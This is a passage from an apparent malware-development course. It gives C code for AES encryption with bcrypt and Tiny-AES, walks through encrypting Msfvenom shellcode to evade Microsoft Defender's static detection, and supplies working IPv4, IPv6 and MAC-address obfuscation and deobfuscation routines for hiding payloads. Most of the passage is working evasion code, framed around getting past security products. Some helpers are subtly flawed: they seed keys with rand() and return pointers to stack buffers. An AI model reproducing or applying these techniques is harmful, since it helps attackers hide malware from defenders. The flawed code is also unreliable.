          printf("0x%0.2X ", Data[i]);
      }

  printf("};\n\n\n");
  
}
```

The other function,??`GenerateRandomBytes`, fills up an input buffer with random bytes which in this case is used to generate a random key and IV.

```c
// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

  for (int i = 0; i < sSize; i++) {
    	pByte[i] = (BYTE)rand() % 0xFF;
  }

}
```

#### Padding

Both??`InstallAesEncryption`??and??`InstallAesDecryption`??functions use the??`BCRYPT_BLOCK_PADDING`??flag with the??`BCryptEncrypt`??and??`BCryptDecrypt`??bcrypt functions respectively, which will automatically pad the input buffer, if required, to be a multiple of 16 bytes, solving the AES padding issue.

#### Main Function - Encryption

The main function below is used to perform the encryption routine on an array of plaintext data.

```c
// The plaintext, in hex format, that will be encrypted
// this is the following string in hex "This is a plain text string, we'll try to encrypt/decrypt !"
unsigned char Data[] = {
	0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x70, 0x6C,
	0x61, 0x69, 0x6E, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x72,
	0x69, 0x6E, 0x67, 0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74,
	0x72, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70,
	0x74, 0x2F, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x20, 0x21
};

int main() {

	BYTE pKey [KEYSIZE];                    // KEYSIZE is 32 bytes
	BYTE pIv [IVSIZE];                      // IVSIZE is 16 bytes

	srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
	GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function
	
	srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
	GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function

	// Printing both key and IV onto the console 
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	// Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
	PVOID pCipherText = NULL;
	DWORD dwCipherSize = NULL;
	
	// Encrypting
	if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &pCipherText, &dwCipherSize)) {
		return -1;
	}

	// Print the encrypted buffer as a hex array
	PrintHexData("CipherText", pCipherText, dwCipherSize);
	
	// Clean up
	HeapFree(GetProcessHeap(), 0, pCipherText);
	system("PAUSE");
	return 0;
}
```

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/encryption-new-225952410-4a747a9a-ef94-479c-be3b-d6ae5e8de27f.png)

#### Main Function - Decryption

The main function below is used to perform the decryption routine. The decryption routine requires the decryption key, IV and ciphertext.

```c
// the key printed to the screen
unsigned char pKey[] = {
		0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8, 0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
		0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D, 0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B };

// the iv printed to the screen
unsigned char pIv[] = {
		0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA, 0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD };


// the encrypted buffer printed to the screen, which is:
unsigned char CipherText[] = {
		0x97, 0xFC, 0x24, 0xFE, 0x97, 0x64, 0xDF, 0x61, 0x81, 0xD8, 0xC1, 0x9E, 0x23, 0x30, 0x79, 0xA1,
		0xD3, 0x97, 0x5B, 0xAE, 0x29, 0x7F, 0x70, 0xB9, 0xC1, 0xEC, 0x5A, 0x09, 0xE3, 0xA4, 0x44, 0x67,
		0xD6, 0x12, 0xFC, 0xB5, 0x86, 0x64, 0x0F, 0xE5, 0x74, 0xF9, 0x49, 0xB3, 0x0B, 0xCA, 0x0C, 0x04,
		0x17, 0xDB, 0xEF, 0xB2, 0x74, 0xC2, 0x17, 0xF6, 0x34, 0x60, 0x33, 0xBA, 0x86, 0x84, 0x85, 0x5E };

int main() {

	// Defining two variables the output buffer and its respective size which will be used in SimpleDecryption
	PVOID	pPlaintext  = NULL;
	DWORD	dwPlainSize = NULL;

	// Decrypting
	if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}
	
	// Printing the decrypted data to the screen in hex format
	PrintHexData("PlainText", pPlaintext, dwPlainSize);
	
	// this will print: "This is a plain text string, we'll try to encrypt/decrypt !"
	printf("Data: %s \n", pPlaintext);
	
	// Clean up
	HeapFree(GetProcessHeap(), 0, pPlaintext);
	system("PAUSE");
	return 0;
}

```

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/encryption-new-225953480-03161b1a-119f-4c97-9b9e-11745047a214.png)

#### bCrypt Library Drawbacks

One of the primary drawbacks of using the method outlined above to implement AES encryption is that the usage of the cryptographic WinAPIs results in them being visible in the binary's Import Address Table (IAT). Security solutions can detect the use of cryptographic functions by scanning the IAT, which can potentially indicate malicious behavior or raise suspicion. Hiding WinAPIs in the IAT is possible and will be discussed in a future module.

The image below shows the IAT of the binary using Windows APIs for AES encryption. The usage of the??`crypt.dll`??library and the cryptographic functions is clearly visible.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/iat-aes.png)

### AES Using Tiny-AES Library

This section makes use of the??[tiny-AES-c](https://github.com/kokke/tiny-AES-c)??third-party encryption library that performs AES encryption without the use of WinAPIs. Tiny-AES-C is a small portable library that can perform AES128/192/256 in C.

#### Setting Up Tiny-AES

To begin using Tiny-AES there are two requirements:

1. Include??`aes.hpp`??(C++) or include??`aes.h`??(C) in the project.
    
2. Add the??`aes.c`??file to the project.
    

#### Tiny-AES Library Drawbacks

Before diving into the code it's important to be aware of the drawbacks of the tiny-AES library.

1. The library does not support padding. All buffers must be multiples of 16 bytes.
    
2. The??[arrays](https://github.com/kokke/tiny-AES-c/blob/master/aes.c#L79)??used in the library can be signatured by security solutions to detect the usage of Tiny-AES. These arrays are used to apply the AES algorithm and therefore are a requirement to have in the code. With that being said, there are ways to modify their signature in order to avoid security solutions detecting the usage of Tiny-AES. One possible solution is to XOR these arrays, for example, to decrypt them at runtime right before calling the initialization function,??`AES_init_ctx_iv`.
    

#### Custom Padding Function

The lack of padding support can be solved by creating a custom padding function as shown in the code snippet below.

```c
BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer        = NULL;
	SIZE_T	PaddedSize          = NULL;

	// calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// allocating buffer of size "PaddedSize"
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer){
		return FALSE;
	}
	// cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// copying old buffer to new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	//saving results :
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize   = PaddedSize;

	return TRUE;
}
```

#### Tiny-AES Encryption

Similar to how the bCrypt library's encryption and decryption process was explained earlier in the module, the snippets below explain Tiny-AES's encryption and decryption process.

```c
#include <Windows.h>
#include <stdio.h>
#include "aes.h"

// "this is plaintext string, we'll try to encrypt... lets hope everything goes well :)" in hex
// since the upper string is 82 byte in size, and 82 is not mulitple of 16, we cant encrypt this directly using tiny-aes
unsigned char Data[] = {
	0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x70, 0x6C, 0x61, 0x6E,
	0x65, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x69, 0x6E, 0x67,
	0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74, 0x72, 0x79, 0x20,
	0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x2E, 0x2E,
	0x2E, 0x20, 0x6C, 0x65, 0x74, 0x73, 0x20, 0x68, 0x6F, 0x70, 0x65, 0x20,
	0x65, 0x76, 0x65, 0x72, 0x79, 0x74, 0x68, 0x69, 0x67, 0x6E, 0x20, 0x67,
	0x6F, 0x20, 0x77, 0x65, 0x6C, 0x6C, 0x20, 0x3A, 0x29, 0x00
};



int main() {
	// struct needed for Tiny-AES library
	struct AES_ctx ctx;


	BYTE pKey[KEYSIZE];                             // KEYSIZE is 32 bytes
	BYTE pIv[IVSIZE];                               // IVSIZE is 16 bytes
		

	srand(time(NULL));                              // the seed to generate the key
	GenerateRandomBytes(pKey, KEYSIZE);             // generating the key bytes
	
	srand(time(NULL) ^ pKey[0]);                    // The seed to generate the IV. Use the first byte of the key to add more randomness.
	GenerateRandomBytes(pIv, IVSIZE);               // Generating the IV

	// Prints both key and IV to the console
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	// Initializing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);


	// Initializing variables that will hold the new buffer base address in the case where padding is required and its size
	PBYTE	PaddedBuffer        = NULL;
	SIZE_T	PAddedSize          = NULL;

	// Padding the buffer, if required
	if (sizeof(Data) % 16 != 0){
		PaddBuffer(Data, sizeof(Data), &PaddedBuffer, &PAddedSize);
		// Encrypting the padded buffer instead
		AES_CBC_encrypt_buffer(&ctx, PaddedBuffer, PAddedSize);
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", PaddedBuffer, PAddedSize);
	}
	// No padding is required, encrypt 'Data' directly
	else {
		AES_CBC_encrypt_buffer(&ctx, Data, sizeof(Data));
		// Printing the encrypted buffer to the console
		PrintHexData("CipherText", Data, sizeof(Data));
	}
	// Freeing PaddedBuffer, if necessary
	if (PaddedBuffer != NULL){
		HeapFree(GetProcessHeap(), 0, PaddedBuffer);
	}
	system("PAUSE");
	return 0;
}

```

#### Tiny-AES Decryption

```c
#include <Windows.h>
#include <stdio.h>
#include "aes.h"

// Key
unsigned char pKey[] = {
		0xFA, 0x9C, 0x73, 0x6C, 0xF2, 0x3A, 0x47, 0x21, 0x7F, 0xD8, 0xE7, 0x1A, 0x4F, 0x76, 0x1D, 0x84,
		0x2C, 0xCB, 0x98, 0xE3, 0xDC, 0x94, 0xEF, 0x04, 0x46, 0x2D, 0xE3, 0x33, 0xD7, 0x5E, 0xE5, 0xAF };

// IV
unsigned char pIv[] = {
		0xCF, 0x00, 0x86, 0xE1, 0x6D, 0xA2, 0x6B, 0x06, 0xC4, 0x8B, 0x1F, 0xDA, 0xB6, 0xAB, 0x21, 0xF1 };

// Encrypted data, multiples of 16 bytes
unsigned char CipherText[] = {
		0xD8, 0x9C, 0xFE, 0x68, 0x97, 0x71, 0x5E, 0x5E, 0x79, 0x45, 0x3F, 0x05, 0x4B, 0x71, 0xB9, 0x9D,
		0xB2, 0xF3, 0x72, 0xEF, 0xC2, 0x64, 0xB2, 0xE8, 0xD8, 0x36, 0x29, 0x2A, 0x66, 0xEB, 0xAB, 0x80,
		0xE4, 0xDF, 0xF2, 0x3C, 0xEE, 0x53, 0xCF, 0x21, 0x3A, 0x88, 0x2C, 0x59, 0x8C, 0x85, 0x26, 0x79,
		0xF0, 0x04, 0xC2, 0x55, 0xA8, 0xDE, 0xB4, 0x50, 0xEE, 0x00, 0x65, 0xF8, 0xEE, 0x7C, 0x54, 0x98,
		0xEB, 0xA2, 0xD5, 0x21, 0xAA, 0x77, 0x35, 0x97, 0x67, 0x11, 0xCE, 0xB3, 0x53, 0x76, 0x17, 0xA5,
		0x0D, 0xF6, 0xC3, 0x55, 0xBA, 0xCD, 0xCF, 0xD1, 0x1E, 0x8F, 0x10, 0xA5, 0x32, 0x7E, 0xFC, 0xAC };



int main() {

	// Struct needed for Tiny-AES library
	struct AES_ctx ctx;
	// Initializing the Tiny-AES Library
	AES_init_ctx_iv(&ctx, pKey, pIv);

	// Decrypting
	AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
	 
	// Print the decrypted buffer to the console
	PrintHexData("PlainText", CipherText, sizeof(CipherText));

	// Print the string
	printf("Data: %s \n", CipherText);

	// exit
	system("PAUSE");
	return 0;
}
```

### Tiny-AES IAT

The image below shows a binary's IAT which uses Tiny-AES to perform encryption instead of WinAPIs. No cryptographic functions are visible in the IAT of the binary.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/iat-no-winapis.png)

### Conclusion

This module explained the basics of AES and provided two working AES implementations. One should also have an idea of how security solutions will detect the usage of encryption libraries.
# 2.8 Evading Microsoft Defender Static Analysis

### Introduction

This module provides an example using XOR, RC4, and AES encryption algorithms to bypass Microsoft Defender's static analysis engine. At this point of the modules, the payload is not being executed, rather it's simply being printed to the console. Therefore, this module will be focusing specifically on static/signature evasion.

### Code Samples

There are 4 code samples available for download that this module uses. Each of the code samples is using a Msfvenom shellcode.

1. Raw Shellcode - Detected by Defender
    
2. XOR Encrypted Shellcode - Evades Defender successfully
    
3. AES Encrypted Shellcode - Evades Defender successfully
    
4. RC4 Encrypted Shellcode - Evades Defender successfully
    

The sections below show the binaries being executed and Microsoft Defender's response. Recall that Microsoft Defender has a pre-configured exclusion for the??`C:\Users\MalDevUser\Desktop\Module-Code`??folder.

#### Raw Shellcode

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/raw-shellcode-defender.png)

#### XOR Encryption

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/xor-shellcode-defender.png)

#### AES Encryption

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/aes-shellcode-defender.png)

#### RC4 Encryption

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/rc4-shellcode-defender.png)
# 2.9 Payload Obfuscation - IPv4-IPv6Fuscation

### Introduction

At this stage of the learning path, one should have a fundamental understanding of payload encryption. This module will explore another method of evading static detection using payload obfuscation.

A malware developer should have several tools available at their disposal to achieve the same task in order to stay unpredictable. Payload obfuscation can be seen as a different "tool" when compared to payload encryption, yet both are ultimately used for the same purpose.

After going through this module, one should be able to use advanced payload obfuscation techniques, some of which are being used in the wild, such as in??[Hive ransomware](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/).

The code shown in this module and upcoming modules should be compiled in release mode. Compiling in debug mode will result in the binary not working correctly.

### What is IPv4/IPv6Fuscation

IPv4/IPv6Fuscation is an obfuscation technique where the shellcode's bytes are converted to IPv4 or IPv6 strings. Let's use a few bytes from the Msfvenom x64 calc shellcode and analyze how they can be converted into either IPv4 or IPv6 strings. For this example, the following bytes are used:

`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51`.

- **IPv4Fuscation**??- Since IPv4 addresses are composed of 4 octets, IPv4Fuscation uses 4 bytes to generate a single IPv4 string with each byte representing an octet. Take each byte, which is currently in hex and convert it to decimal format to get one octet. Using the above bytes as an example,??`FC`??is 252 in decimal,??`48`??is 72,??`83`??is 131 and??`E4`??is 228. Therefore, the first 4 bytes of the sample shellcode,??`FC 48 83 E4`??will be??`252.72.131.228`.
    
- **IPv6Fuscation**??- This will utilize similar logic as the IPv4Fuscation example but instead of using 4 bytes per IP address, 16 bytes are used to generate one IPv6 address. Furthermore, converting the bytes to decimal is not a requirement for IPv6 addresses. Using the sample shellcode as an example, it will be??`FC48:83E4:F0E8:C000:0000:4151:4150:5251`.
    

### IPv4Fuscation Implementation

Now that the logic has been explained, this section will dive into the implementation of IPv4Fuscation. A few points about the code snippet below:

- As previously mentioned, generating an IPv4 address requires 4 bytes therefore the shellcode must be multiples of 4. It's possible to create a function that pads the shellcode if it doesn't meet that requirement. Padding issues in the obfuscation modules are addressed in the the upcoming??_HellShell_??module.
    
- `GenerateIpv4`??is a helper function that takes 4 shellcode bytes and uses??`sprintf`??to generate the IPv4 address.
    
- Lastly, the code only covers obfuscation whereas deobfuscation is explained later in the module.
    

```c
// Function takes in 4 raw bytes and returns them in an IPv4 string format
char* GenerateIpv4(int a, int b, int c, int d) {
	unsigned char Output [32];

	// Creating the IPv4 address and saving it to the 'Output' variable 
	sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

	// Optional: Print the 'Output' variable to the console
	// printf("[i] Output: %s\n", Output);

	return (char*)Output;
}


// Generate the IPv4 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 4, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 4 != 0){
		return FALSE;
	}
	printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));
	
	// We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 4.
	int c = 4, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address
		if (c == 4) {
			counter++;

			// Generating the IPv4 address from 4 bytes which begin at i until [i + 3] 
			IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

			if (i == ShellcodeSize - 4) {
				// Printing the last IPv4 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv4 address
				printf("\"%s\", ", IP);
			}

			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 8 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}
```

### IPv6Fuscation Implementation

When using IPv6Fuscation, the shellcode should be a multiple of 16. Again, it's possible to create a function that pads the shellcode if it doesn't meet that requirement.

```c
// Function takes in 16 raw bytes and returns them in an IPv6 address string format
char* GenerateIpv6(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each IPv6 segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in an IPv6 (32 * 4 = 128)
	char result[128];

	// Generating output0 using the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X:%0.2X%0.2X", a, b, c, d);

	// Generating output1 using the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X:%0.2X%0.2X", e, f, g, h);

	// Generating output2 using the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X:%0.2X%0.2X", i, j, k, l);

	// Generating output3 using the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X:%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the IPv6 address
	sprintf(result, "%s:%s:%s:%s", Output0, Output1, Output2, Output3);

	// Optional: Print the 'result' variable to the console
	// printf("[i] result: %s\n", (char*)result);

	return (char*)result;
}


// Generate the IPv6 output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateIpv6Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0){
		return FALSE;
	}
	printf("char* Ipv6Array [%d] = { \n\t", (int)(ShellcodeSize / 16));
	
	// We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* IP = NULL;
	
	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address
		if (c == 16) {
			counter++;

			// Generating the IPv6 address from 16 bytes which begin at i until [i + 15]
			IP = GenerateIpv6(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last IPv6 address
				printf("\"%s\"", IP);
				break;
			}
			else {
				// Printing the IPv6 address
				printf("\"%s\", ", IP);
			}
			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}

```

### IPv4/IPv6Fuscation Deobfuscation

Once the obfuscated payload has evaded static detection, it will need to be deobfuscated to be executed. The deobfuscation process will reverse the obfuscation process, allowing an IP address to generate bytes instead of using bytes to generate an IP address. Performing deobfuscation will require the following:

- **IPv4 Deobfuscation**??- This requires the use of the NTAPI??[RtlIpv4StringToAddressA](https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv4stringtoaddressa). It converts a string representation of an IPv4 address to a binary IPv4 address.
    
- **IPv6 Deobfuscation**??- Similar to the previous function, IPv6 deobfuscation will require the use of another NTAPI??[RtlIpv6StringToAddressA](https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv6stringtoaddressa). This function converts an IPv6 address to a binary IPv6 address.
    

### Deobfuscating IPv4Fuscation Payloads

The??`Ipv4Deobfuscation`??function takes in an??`Ipv4Array`??as the first parameter which is an array of IPv4 addresses. The second parameter is the??`NmbrOfElements`??which is the number of IPv4 addresses in the??`Ipv4Array`??array in order to loop through the size of the array. The last 2 parameters,??`ppDAddress`??and??`pDSize`??will be used to store the deobfuscated payload and its size, respectively.

The deobfuscation process works by first grabbing the address of??`RtlIpv4StringToAddressA`??using??`GetProcAddress`??and??`GetModuleHandle`. Next, a buffer is allocated which will eventually store the deobfuscated payload of size??`NmbrOfElements`??* 4. The reasoning behind that size is that each IPv4 will generate 4 bytes.

Moving onto the for loop, it starts by defining a new variable,??`TmpBuffer`, and setting it to be equal to??`pBuffer`. Next,??`TmpBuffer`??is passed to??`RtlIpv4StringToAddressA`??as its fourth parameter, which is where the binary representation of the IPv4 address will be stored. The??`RtlIpv4StringToAddressA`??function will write 4 bytes to the??`TmpBuffer`??buffer, therefore??`TmpBuffer`??is incremented by 4, after, to allow the next 4 bytes to be written to it without overwriting the previous bytes.

Finally,??`ppDAddress`??and??`pDSize`??are set to hold the base address of the deobfuscated payload as well as its size.

```c
typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR		S,
	BOOLEAN		Strict,
	PCSTR*		Terminator,
   	PVOID		Addr
);

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer                 = NULL, 
                    TmpBuffer               = NULL;

	SIZE_T          sBuffSize               = NULL;

	PCSTR           Terminator              = NULL;

	NTSTATUS        STATUS                  = NULL;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv4 addresses * 4
	sBuffSize = NmbrOfElements * 4;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the IPv4 addresses saved in Ipv4Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv4 address at a time
		// Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
		if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
			return FALSE;
		}

		// 4 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 4);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress     = pBuffer;
	*pDSize         = sBuffSize;

	return TRUE;
}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/ipv4fuscation.png)

### Deobfuscating IPv6Fuscation Payloads

Everything in the deobfuscation process for IPv6 is the same as IPv4 with the only two main differences being:

1. `RtlIpv6StringToAddressA`??is used instead of??`RtlIpv4StringToAddressA`.
    
2. Each IPv6 address is being deobfuscated into 16 bytes instead of 4 bytes.
    

```c
typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR		S,
	PCSTR*		Terminator,
	PVOID		Addr
);

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer                 = NULL, 
                    TmpBuffer               = NULL;

	SIZE_T          sBuffSize               = NULL;

	PCSTR           Terminator              = NULL;

	NTSTATUS        STATUS                  = NULL;

	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of IPv6 addresses * 16
	sBuffSize = NmbrOfElements * 16;


	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the IPv6 addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one IPv6 address at a time
		// Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress  = pBuffer;
	*pDSize      = sBuffSize;

	return TRUE;

}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/ipv6fuscation.png)

[Previous](https://maldevacademy.com/modules/20?view=blocks&hide=true)
# 3.0 Payload Obfuscation - MACFucscation

### Introduction

This module will go through another obfuscation technique that is similar to IPv4/IPv6fuscation but instead converts shellcode to MAC addresses.

### MACFuscation Implementation

The implementation of MACFuscation will be similar to what was done in the previous module with IPv4/IPv6fuscation. A MAC address is made up of 6 bytes, therefore the shellcode should be a multiple of 6, which again can be padded if it doesn't meet that requirement.

```c
// Function takes in 6 raw bytes and returns them in a MAC address string format
char* GenerateMAC(int a, int b, int c, int d, int e, int f) {
	char Output[64];

	// Creating the MAC address and saving it to the 'Output' variable 
	sprintf(Output, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X",a, b, c, d, e, f);

	// Optional: Print the 'Output' variable to the console
	// printf("[i] Output: %s\n", Output);

	return (char*)Output;
}

// Generate the MAC output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the shellcode buffer is null or the size is not a multiple of 6, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 6 != 0){
		return FALSE;
	}
	printf("char* MacArray [%d] = {\n\t", (int)(ShellcodeSize / 6));

	// We will read one shellcode byte at a time, when the total is 6, begin generating the MAC address
	// The variable 'c' is used to store the number of bytes read. By default, starts at 6.
	int c = 6, counter = 0;
	char* Mac = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		// Track the number of bytes read and when they reach 6 we enter this if statement to begin generating the MAC address
		if (c == 6) {
			counter++;
			
			// Generating the MAC address from 6 bytes which begin at i until [i + 5] 
			Mac = GenerateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5]);
			
			if (i == ShellcodeSize - 6) {

				// Printing the last MAC address
				printf("\"%s\"", Mac);
				break;
			}
			else {
				// Printing the MAC address
				printf("\"%s\", ", Mac);
			}
			c = 1;

			// Optional: To beautify the output on the console
			if (counter % 6 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}

```

#### Deobfuscating MACFuscation Payloads

